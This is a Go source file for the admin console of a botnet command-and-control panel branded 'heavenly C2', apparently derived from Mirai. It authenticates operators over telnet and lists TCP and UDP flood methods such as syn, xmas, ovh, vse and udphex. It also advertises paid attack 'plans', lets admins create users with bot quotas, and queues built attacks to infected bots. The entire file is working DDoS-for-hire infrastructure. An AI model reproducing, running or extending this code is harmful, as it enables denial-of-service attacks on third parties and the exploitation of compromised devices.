package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    
)
//
type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;heavenly C2 | Enter Your Login Information.\007"))); err != nil {//93m
                this.conn.Close()
            }
    // Get username
    this.conn.SetDeadline(time.Now().Add(999 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[0mLogin as:\x1b[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(999 * time.Second))
    this.conn.Write([]byte("\033[0mPassword:\x1b[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(2312313 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[0m Authentication Failed \r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
}
    this.conn.Write([]byte("\033[2J\033[1H")) //zuurry
    go func() {
        i := 0
        for {
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {// zuurry
            } else {
            }
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; welcome to heavenly C2 User > %s\007", username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))// @xGkun// @xGkun// @xGkun// @xGkun
            }
        }
    }()
            time.Sleep(350 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m5%\x1b[37m]\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(389 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m20%\x1b[37m]\r\n"))
            this.conn.Write([]byte("\r\n")) 
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m45%\x1b[37m]\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(420 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m50%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m60%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(460 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m70%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m80%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m90%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))        
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m95%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))    
            time.Sleep(650 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[37m Loading [\x1b[37m100%\x1b[37m]\r\n")) 
            this.conn.Write([]byte("\r\n"))//zuurry
            this.conn.Write([]byte("\r\n"))    
            time.Sleep(350 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╦ ╦╔═╗╔═╗╦  ╦╔═╗╔╗╔╦ ╦ ╦\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╠═╣║╣ ╠═╣╚╗╔╝╠═╣║║║║ ╚╦╝\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╩ ╩╚═╝╩ ╩ ╚╝ ╩ ╩╝╚╝╩═╝╩ \033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                   ╔═════════════════════════════════════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                   ║\033[97m       welcome "+username+" to heavenly C2     \x1b[38;2;230;0;38m║\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                   ╚═════════════════════════════════════════╝\033[0m\r\n"))
                                 
            time.Sleep(200 * time.Millisecond)

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[38;2;230;0;38m" + username + "\x1b[0;37m@\x1b[38;2;230;0;38mheavenly\x1b[0;37m:\033[0m"))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
            
        }
		
			if cmd == "clear" || cmd == "cls" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))  
            this.conn.Write([]byte("\033[97m       .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m     .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m    (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m         .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m       .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m      (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m             .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m           .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m          (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                  .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m               (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                      .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                    .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                   (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                      .--._____,  o\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                    .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                   (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m                             o\r\n"))
            this.conn.Write([]byte("\033[97m             .--._____,    \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m           .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m          (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m                                           o\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                  .--._____, \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m               (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                      .--._____,            o\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                    .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                   (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m                                              o\r\n"))
            this.conn.Write([]byte("\033[97m             .--._____,    \033[0m\r\n"))
            this.conn.Write([]byte("\033[97m           .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m          (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                  .--._____,                          o\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m               (O_o_o_o_o_O)\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
         this.conn.Write([]byte("\033[0m\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                      .--._____,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                    .-='=='==-,\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m                   (O_o_o_o_o_O)                         o\033[0m\r\n"))
            this.conn.Write([]byte("\033[97m\033[0m\r\n"))
         time.Sleep(150 * time.Millisecond)
         this.conn.Write([]byte("\033[2J\033[1H"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                                _.-^^---.\033[97m...,,--      \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                            _--          \033[97m        --_  \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                           <             \033[97m           >)\033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                           |             \033[97m            |\033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                            /._          \033[97m         _./ \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                               ```--. . ,\033[97m ; .--'''    \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                                     | | \033[97m  |          \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                                  .-=||  \033[97m| |=-.       \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                                  `-=#$%&\033[97m%$#=-'       \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                                     | ; \033[97m :|          \033[0m\r\n"))
                    this.conn.Write([]byte("\033[97m                            _____.,-#%&$@\033[97m%#&#~,._____ \033[0m\r\n"))
         time.Sleep(2000 * time.Millisecond)
             this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╦ ╦╔═╗╔═╗╦  ╦╔═╗╔╗╔╦ ╦ ╦\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╠═╣║╣ ╠═╣╚╗╔╝╠═╣║║║║ ╚╦╝\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                            ╩ ╩╚═╝╩ ╩ ╚╝ ╩ ╩╝╚╝╩═╝╩ \033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                ╔═════════════════════════════════════════════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                ║\033[97m welcom to heavenly C2 coded & modiffied by ferar\x1b[38;2;230;0;38m  ║\033[0m\r\n"))
            this.conn.Write([]byte("\x1B[38;2;230;0;38m                ╚═════════════════════════════════════════════════╝\033[0m\r\n"))

            continue
        
			}
			if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) 
            botCount = clientList.Count()
            this.conn.Write([]byte("\x1b[37m ╔═══════════════════════\x1b[38;2;230;0;38m═══╗\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Project heavenly 2021 \x1b[38;2;230;0;38m   ╚═══════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ udp     -  lists udp methods.                    \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ clear   -  clears the terminal.                  \x1b[38;2;230;0;38m║\r\n"))            
            this.conn.Write([]byte("\x1b[37m ║ tcp     -  lists tcp methods.                    \x1b[38;2;230;0;38m║\r\n"))         
            this.conn.Write([]byte("\x1b[37m ║ exit    -  exits from the net.                   \x1b[38;2;230;0;38m║\r\n")) 
            this.conn.Write([]byte("\x1b[37m ║ plans   -  lists plans.                          \x1b[38;2;230;0;38m║\r\n")) 
            this.conn.Write([]byte("\x1b[37m ╚════════════════════════\x1b[38;2;230;0;38m══════════════════════════╝\r\n"))
			continue

           }
            if err != nil || cmd == "tcp" || cmd == "TCP" {
                    this.conn.Write([]byte("\033[2J\033[1H")) 
                    this.conn.Write([]byte("\r\n"))  
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                 ╔╦╗╔═╗╔═╗   \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                  ║ ║  ╠═╝   \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                  ╩ ╚═╝╩     \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ╔═══════════╗╔═══════════╗╔═══════════╗    \033[0m \r\n"))                                     
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38msyn\x1b[97m       ║║ \033[38;2;230;0;38mxmas\x1b[97m      ║║ \033[38;2;230;0;38mfrag\x1b[97m      ║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38mack\x1b[97m       ║║ \033[38;2;230;0;38mice\x1b[97m       ║║ \033[38;2;230;0;38mnfodown\x1b[97m   ║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38mstomp\x1b[97m     ║║ \033[38;2;230;0;38mtcpall\x1b[97m    ║║ \033[38;2;230;0;38movh\x1b[97m       ║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ╚═══════════╝╚═══════════╝╚═══════════╝    \033[0m \r\n"))
            continue

			}
		    if err != nil || cmd == "plans" || cmd == "plans" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header             
            this.conn.Write([]byte("\x1b[37m ╔════════════\x1b[38;2;230;0;38m════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Starter - {15}             \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Attack Time - 700          \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Length -  30.4167          \x1b[38;2;230;0;38m║\r\n"))            
            this.conn.Write([]byte("\x1b[37m ║════════════\x1b[38;2;230;0;38m════════════════║\r\n"))            
            this.conn.Write([]byte("\x1b[37m ║ Advanced - {25}            \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Attack Time - 2300         \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Length -  30.4167          \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║═════════════\x1b[38;2;230;0;38m═══════════════║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Professional - {50}        \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Attack Time - 4000         \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Length -  30.4167          \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║═════════════\x1b[38;2;230;0;38m═══════════════║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Ultimate - {70}            \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Attack Time - 4000         \x1b[38;2;230;0;38m║\r\n"))
            this.conn.Write([]byte("\x1b[37m ║ Length -  Lifetime         \x1b[38;2;230;0;38m║\r\n"))            
            this.conn.Write([]byte("\x1b[37m ╚═════════════\x1b[38;2;230;0;38m═══════════════╝\r\n"))
            continue


            
            }
			if err != nil || cmd == "UDP" || cmd == "udp" {
                    this.conn.Write([]byte("\033[2J\033[1H")) 
                    this.conn.Write([]byte("\r\n")) 
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                 ╦ ╦╔╦╗╔═╗           \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                 ║ ║ ║║╠═╝           \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[38;2;230;0;38m                                 ╚═╝═╩╝╩             \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ╔═══════════╗╔═══════════╗╔═══════════╗    \033[0m \r\n"))                                     
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38mudp\x1b[97m       ║║ \033[38;2;230;0;38mudpplain\x1b[97m  ║║ \033[38;2;230;0;38mudphex\x1b[97m    ║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38mvse\x1b[97m       ║║ \033[38;2;230;0;38mstd\x1b[97m       ║║ \033[38;2;230;0;38mkillall   \x1b[97m║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ║ \033[38;2;230;0;38mrandhex\x1b[97m   ║║ \033[38;2;230;0;38mraid\x1b[97m      ║║ \033[38;2;230;0;38mstdhex \x1b[97m   ║    \033[0m \r\n"))
                    this.conn.Write([]byte("\x1b[97m                 ╚═══════════╝╚═══════════╝╚═══════════╝    \033[0m \r\n"))
            continue
			}
		    
            if err != nil || cmd == "@" || cmd == "-1" || cmd == "-2" || cmd == "-3" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[37mkys\r\n"))
            continue
        }

        if strings.HasPrefix(cmd, "-") {
            this.conn.Write([]byte(" \033[37mCrash Attempt Logged!\033[0m\r\n"))
            continue
        }
			if userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
				m := clientList.Distribution()
				for k, v := range m {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal bots: \033[01;31m[\033[01;31m%d\033[01;31m]\r\n\033[0m", botCount)))
				continue
			}
			
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }


            if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
                this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }
        if cmd[0] == '*' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '-' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
